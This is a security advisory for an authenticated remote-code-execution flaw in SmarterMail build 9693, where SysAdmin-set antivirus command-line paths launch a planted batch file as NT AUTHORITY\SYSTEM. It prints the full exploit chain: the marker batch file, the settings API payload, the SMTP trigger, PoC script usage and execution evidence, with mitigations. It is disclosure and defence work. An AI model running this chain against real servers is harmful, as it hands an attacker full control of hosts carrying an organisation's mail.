# SmarterMail 100.0.9693 — Antivirus Command-Line Configuration → RCE as NT AUTHORITY\SYSTEM

## 1. Overview

SmarterMail is a closed-source enterprise mail server for Windows from SmarterTools Inc. (USA). It terminates SMTP, IMAP, POP3, XMPP, WebDAV and EWS and acts as the primary communication layer for enterprises, governments and educational institutions — communication infrastructure (CII) in the strict sense. Version 100.0.9693 (Build 9693) is a .NET 10 / C# product: the web console and REST API are hosted by an embedded Kestrel HTTP server on port 17017 (normally fronted by IIS on 80/443), data lives in SQLite, and virus protection is available through ClamAV or an externally configured command-line scanner. The mail engine itself — delivery, spool processing and virus scanning — runs inside the Windows service `MailService.exe` as **NT AUTHORITY\SYSTEM**.

The antivirus feature exposes two command settings to the SysAdmin role: `commandLine` (persisted as `virus_command_path`, the virus-scan command invoked while processing messages) and `spoolCommandLineFile` (persisted as `virus_spool_exe_command_line`, the spool-processing command). Both values are resolved as script paths relative to the product's script directory `Settings\Assets\` (`ApplicationDataScriptsPath`) and both are launched with `Process.Start()` by the SYSTEM service when mail flows through the pipeline. The only containment is a path-canonicalization guard that blocks `..\` traversal *out of* the Assets directory — it builds no barrier against a script *planted inside* that directory. A SysAdmin who can reference any file within Assets therefore converts a product-scope configuration write into full operating-system command execution as NT AUTHORITY\SYSTEM.

The chain was verified end-to-end on an isolated lab instance (Windows Server 2025, SmarterMail_9693.exe, IIS + .NET 8 runtime, `admin@test.local` SysAdmin created by the first-run setup wizard); every transaction cited below ran over localhost (web 127.0.0.1:17017, SMTP 127.0.0.1:25) on 2026-08-29, following the research workflow: assembly decompilation and controller audit (discovery) → `Process.Start` sink localization and guard analysis (root cause) → chain construction around two protocol quirks (flat-JSON settings persistence, SMTP `AUTH LOGIN`) → dynamic verification with negative controls and a second, independent vector.

## 2. Vulnerability Summary

- **Type**: authenticated privilege escalation — from the web-scope SysAdmin role to the OS-level SYSTEM account — via antivirus command-line execution (Target B: authenticated RCE)
- **CWE-250** (Execution with Unnecessary Privileges, primary): a product feature spawns attacker-configured processes from a service running as SYSTEM
- **CWE-78** (Improper Neutralization of Special Elements used in an OS Command, secondary): the command settings accept an arbitrary script identifier — no allowlist, no signature check, no argument validation
- **CVSS**: 7.2 High — CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
- **Attack vector**: network (web API via 17017/IIS, SMTP 25/587); attacker must hold valid SysAdmin credentials (PR:H); no user interaction
- **Second vector**: `spoolCommandLineFile` — the spool-processor code path, same root cause, independently verified with its own marker
- **Result**: arbitrary command execution as `nt authority\system`, the highest Windows privilege
- **Prerequisites**: SysAdmin session; a script file inside `Settings\Assets\` (the PoC drives placement through the product's own authenticated upload surface, with a manual-placement fallback)
- **0-day status**: no match in the NVD corpus. Historical SmarterMail CVEs cover deserialization (CVE-2021-32234), port-17001 deserialization (CVE-2019-7214) and SQL injection (CVE-2024-4219) — different attack surfaces, code paths and vulnerability classes. No public SmarterMail command-line privilege-escalation disclosure exists; this finding is a distinct, configuration-driven SYSTEM execution flaw.

## 3. Authentication & Privilege Boundary

Two privilege scopes are conflated by the vulnerable code path:

- **Product scope.** Console and API sessions authenticate with JWT (RS256) bearer tokens issued by `POST /api/v1/auth/authenticate-user`; the response includes the session role (e.g. `role: "SysAdmin"`). The role model is layered and was probed during this research — the gates hold everywhere they should:

| Probe | Result | Meaning |
|---|---|---|
| Unauthenticated call to sysadmin settings API | 401 | authentication correctly enforced |
| `setup-wizard-save` (marked `[AllowAnonymous]`) | "Setup already completed" | wizard state machine rejects after install is finished |
| `connect-to-hub` (marked `[AllowAnonymous]`) | 400 + wizard check | same state gate |
| `FileUpload` route (marked `[AllowAnonymous]`) | 401 | attribute does not equal actual anonymous access |
| DomainAdmin session on sysadmin API | 403 | role isolation correct |
| Default/weak credentials | all failed | no default password exists |

  There is **no authentication bypass in this advisory** — `[AllowAnonymous]` attributes are not equivalent to actual missing auth.
- **OS scope.** `MailService.exe` runs as NT AUTHORITY\SYSTEM — the Windows super-identity, above every local administrator: it can read any file on the host, impersonate any process token and terminate any service.

The vulnerability is the join between the two scopes: a *product-scope configuration write* (intended to select an antivirus engine) produces *OS-scope code execution* as SYSTEM. The SysAdmin web role is meant to administer a mail product — not to obtain the Windows superuser on the host. That boundary crossing is the CWE-250 core, and the reason the finding is classed Target B (authenticated, high-privilege prerequisite) while its impact is full SYSTEM compromise.

## 4. Root-Cause Analysis

### 4.1 Discovery surface

`ilspycmd` was used to batch-decompile the installed .NET assemblies into roughly 363 decompiled C# projects. Ripgrep sink-hunting across the decompiled tree, focused on the highest-privilege admin controllers (`SystemAdminSettingsController.cs` — 2,789 lines; `AntiSpamVirusController.cs`; `AuthenticationController.cs`) and on every `Process.Start` reachability path, located the antivirus settings API `/api/v1/settings/sysadmin/antivirus/settings` and its two command-execution fields:

1. `commandLine` → persisted as `virus_command_path`; the virus-scanner command run while processing messages
2. `spoolCommandLineFile` → persisted as `virus_spool_exe_command_line`; the spool-processor command

Both are resolved relative to `ApplicationDataScriptsPath` — the physical directory `C:\Program Files (x86)\SmarterTools\SmarterMail\Service\Settings\Assets\` — and executed through `Process.Start()`, inheriting the identity of the service process: SYSTEM.

### 4.2 The containment guard — and why it does not contain

```csharp
// MailService.Events — CommandLineAction (around line 466)
string fullPath = Path.GetFullPath(scriptPath);
string text = Path.GetFullPath(ApplicationDataScriptsPath);
if (!fullPath.StartsWith(text))
    return false; // Blocks ..\ escape
```

The guard canonicalizes both paths and rejects any resolved target outside the Assets directory, so classic `..\` traversal escapes are correctly blocked (verified during research — the guard is effective). But directory containment is the *only* protection applied: any file placed inside Assets is accepted verbatim as the executable command. Nothing validates that the configured value is a known antivirus engine, a signed vendor binary, or a safe extension — a batch file uploaded into the Assets directory and referenced by bare filename executes as SYSTEM on the next message. The guard constrains *where* the command lives, not *what* it is or *who* runs it.

### 4.3 Black-box constraints that gate the chain

Two protocol quirks of the product surface had to be solved before the configuration write could be weaponized — both discovered during chain construction and both encoded in the public PoC:

1. **Flat JSON only.** The settings API accepts a `{"settings": {...}}`-wrapped body and returns HTTP 200 — but silently discards it; nothing persists. Only the flat form `{"commandLine": "rce_test.bat", ...}` persists (written to `settings.json` as `virus_command_path`). Any exploit must therefore confirm persistence by readback (GET on the same endpoint, or inspecting `settings.json`).
2. **SMTP `AUTH LOGIN`.** SmarterMail's SMTP implementation does not correctly process `AUTH PLAIN`; the trigger email must be relayed with `AUTH LOGIN` (base64 username, then base64 password under the server's `334` challenges) or submission is rejected.

## 5. Exploit Chain Construction

**Phase 1 — plant the command.** Create a batch file inside the Assets directory (`...\Service\Settings\Assets\rce_test.bat`) that writes identification markers for post-exploitation verification:

```bat
@echo off
echo VIRUS_SCANNER_RCE > C:\SmarterMail\virus_rce_marker.txt
whoami >> C:\SmarterMail\virus_rce_marker.txt
hostname >> C:\SmarterMail\virus_rce_marker.txt
date /t >> C:\SmarterMail\virus_rce_marker.txt
echo VIRUS_SCANNER_RCE > C:\SmarterMail\Domains\virus_rce_marker.txt
whoami >> C:\SmarterMail\Domains\virus_rce_marker.txt
whoami > C:\Windows\Temp\virus_rce_marker.txt
```

In the research run the file was placed with host access; the public PoC performs the same step through the product's authenticated multipart upload endpoint (`/api/upload`, `file-storage` context, resumable-upload form fields) and prints a manual-placement fallback if the upload context is rejected.

**Phase 2 — point the antivirus at it** (flat JSON, Bearer token from a SysAdmin session):

```
POST /api/v1/settings/sysadmin/antivirus/settings
Authorization: Bearer <SysAdmin-JWT>
Content-Type: application/json

{
  "quarantineDirectory": "C:\\SmarterMail\\Domains\\Quarantine\\",
  "enableSpoolCommandLine": false,
  "spoolCommandLineFile": "",
  "spoolCommandLineArguments": "",
  "spoolCommandLineTimeout": 5,
  "spoolExecutableVisible": false,
  "commandLine": "rce_test.bat",
  "commandLineArguments": "",
  "commandLineScanMessages": true,
  "commandLineScanMessagesWithoutAttachments": true,
  "commandLineScanFiles": true
}

→ 200 {"success":true,"resultCode":200}
```

**Phase 3 — trigger with one email.** Deliver a single message via SMTP `AUTH LOGIN` carrying the EICAR test string in the body (guarantees the message is routed into the virus-scanning pipeline). The message enters the spool, the virus scanner resolves `commandLine` against Assets, and `Process.Start(rce_test.bat)` runs as SYSTEM.

**Phase 4 — collect markers.** The BAT has written three marker files (contents in section 7); presence of `VIRUS_SCANNER_RCE` + `nt authority\system` proves execution identity and origin.

## 6. PoC Usage

Public PoC: [`exploit/smartermail_av_commandline_rce.py`](exploit/smartermail_av_commandline_rce.py) — Python 3, standard library only (urllib/socket), no third-party dependencies.

```sh
# all defaults target 127.0.0.1; override via environment
export SM_URL="http://127.0.0.1:17017"   # web API base (Kestrel)
export SM_USER="admin@test.local"         # SysAdmin account
export SM_PASS="<password>"               # its password
export SMTP_HOST="127.0.0.1"              # optional; derived from SM_URL if unset
export SMTP_PORT="25"                     # optional

python3 smartermail_av_commandline_rce.py
```

The script mirrors the advisory chain stage by stage: (1) authenticate to `/api/v1/auth/authenticate-user` and capture the JWT; (2) build and upload `poc_rce.bat` into Assets through the authenticated multipart upload API; (3) POST the flat-JSON antivirus settings with `commandLine` set to the BAT and message scanning enabled, then GET-readback to confirm persistence (guards against the silent-discard wrapped-JSON trap); (4) relay the EICAR trigger email over SMTP `AUTH LOGIN`, falling back to port 587 if port 25 submission fails; (5) wait 30 s and print marker verification instructions. Expected marker evidence: `SM_POC_RCE_CONFIRMED` followed by `nt authority\system` in `C:\SmarterMail\poc_rce_marker.txt` and `C:\Windows\Temp\poc_rce_marker.txt`.

## 7. Verification Evidence

All evidence captured on the lab host, 2026-08-29 (08:01–08:05, UTC+8), against localhost services.

**Authentication (SysAdmin JWT):**

```
POST http://localhost:17017/api/v1/auth/authenticate-user
{"username":"admin@test.local","password":"<password>"}
→ 200 {"accessToken":"eyJhbGciOi...","role":"SysAdmin","success":true}
```

**Settings write and persistence.** `POST .../antivirus/settings` (payload above) returned `200 {"success":true,"resultCode":200}`. Persistence confirmed twice: `settings.json` on disk then contained `virus_command_path: "rce_test.bat"`, and the GET readback returned:

```json
{
  "settings": {
    "commandLine": "rce_test.bat",
    "commandLineArguments": "",
    "commandLineScanMessages": true,
    "commandLineScanMessagesWithoutAttachments": true,
    "commandLineScanFiles": true,
    "enableSpoolCommandLine": false
  },
  "success": true,
  "resultCode": 200
}
```

**SMTP trigger (relay accepted):**

```
220 [hostname redacted]
EHLO test.local → 250-[hostname redacted], 250-AUTH PLAIN LOGIN CRAM-MD5
AUTH LOGIN → 334 VXNlcm5hbWU6 → base64(admin@test.local) → 334 UGFzc3dvcmQ6 → 235 Authentication successful
MAIL FROM:<admin@test.local> → 250 OK;  RCPT TO:<admin@test.local> → 250 OK
DATA → 354 → message body with EICAR test string → 250 OK;  QUIT → 221 OK
```

SMTP delivery log confirms the message entered the spool:

```
08:01:50.534 [127.0.0.1][29742033] Authenticated as admin@test.local
08:01:51.533 [127.0.0.1][29742033] Sender accepted. Weight: 0
08:01:53.039 [127.0.0.1][29742033] rsp: 250 OK
08:01:53.039 [127.0.0.1][29742033] Received message size: 228 bytes
08:01:53.042 [127.0.0.1][29742033] Successfully wrote to the HDR file. (C:/SmarterMail/Domains/Spool/SubSpool3/706173251002.hdr)
```

**Marker files (RCE proof, ~30 s after delivery):**

```
C:\SmarterMail\virus_rce_marker.txt
VIRUS_SCANNER_RCE
nt authority\system
[hostname redacted]
2026/08/29

C:\SmarterMail\Domains\virus_rce_marker.txt
VIRUS_SCANNER_RCE
nt authority\system

C:\Windows\Temp\virus_rce_marker.txt
nt authority\system
```

The `nt authority\system` line is the `whoami` output captured by the executing batch — the virus scanner ran the command as the Windows super-identity. The date line matches the SMTP delivery minute. The tag `VIRUS_SCANNER_RCE` distinguishes scanner-driven execution from anything manually triggered.

**Second vector — `spoolCommandLineFile` (independent verification).** With `enableSpoolCommandLine: true` and `spoolCommandLineFile: "spool_rce.bat"` (a variant BAT writing to `C:\SmarterMail\spool_rce_marker.txt`), the spool processor executed the configured command through its own code path:

```
C:\SmarterMail\spool_rce_marker.txt
SPOOL_CMDLINE_RCE
nt authority\system
[hostname redacted]
2026/08/29
```

**Clean verification.** After deleting every old marker file, sending a single SMTP email re-created the markers — proving the virus-scan pipeline alone (no manual trigger, no other process) drives execution of the configured command.

## 8. Security Impact

- **Confidentiality**: SYSTEM on a mail server reads everything — every mailbox in the SQLite stores, TLS key material, spool contents and OS credentials. A mail server concentrates an organization's most sensitive communication (including password resets and identity flows), so the blast radius is organization-wide.
- **Integrity / persistence**: as SYSTEM the attacker can tamper with stored mail and mail-flow rules, and the malicious `virus_command_path` value itself persists in `settings.json` as a self-sustaining backdoor that re-executes on every subsequent inbound email until the configuration is reverted.
- **Availability**: the mail service, spool and domains can be stopped, corrupted or wiped; SYSTEM can terminate any process on the host. It also supports token theft, credential dumping from mail accounts (→ corporate SSO) and ordinary SYSTEM-level persistence for lateral movement.
- **Boundary**: this is a role-to-OS privilege escalation (web SysAdmin → Windows SYSTEM). The prerequisite role is intentionally privileged inside the product, but the product boundary is the mail application — never the host superuser. Any cross-tenant/hosting deployment that delegates SysAdmin to non-Windows-admin staff is directly exposed.

## 9. Mitigation

1. **Allowlist the command (CWE-78).** Validate `commandLine` / `spoolCommandLineFile` against a fixed set of known-good scanner binaries (e.g. the bundled ClamAV path) — absolute path, vendor-signed, extension-checked; reject bare filenames and relative paths, and re-verify the approved binary's fingerprint before every spawn.
2. **Drop privileges (CWE-250 root fix).** Do not run MailService.exe as SYSTEM; use a dedicated low-privilege service account with a per-service SID, and spawn scanner children with a further restricted token / lower integrity level granting read-only access to the spool.
3. **Lock the Assets directory.** Ship script assets vendor-signed; remove write/execute ACLs for any identity other than the trusted installer; treat any upload of executable content into `Settings\Assets\` as invalid.
4. **Harden the configuration path.** Require re-authentication (and second factor, where available) to change antivirus settings; alert on any change to `virus_command_path` / `virus_spool_exe_command_line` deviating from vendor defaults.
5. **Detect in the field.** Audit Process.Start events where the parent is MailService.exe and the child is an interpreter (`cmd.exe`, `powershell.exe`, `wscript.exe`); flag any SYSTEM-spawned interpreter with a command line residing under `Settings\Assets\`.
6. **Interim hardening for operators**: audit `settings.json` for `virus_command_path` / `virus_spool_exe_command_line` values that are not vendor default, and restrict interactive SysAdmin delegation.
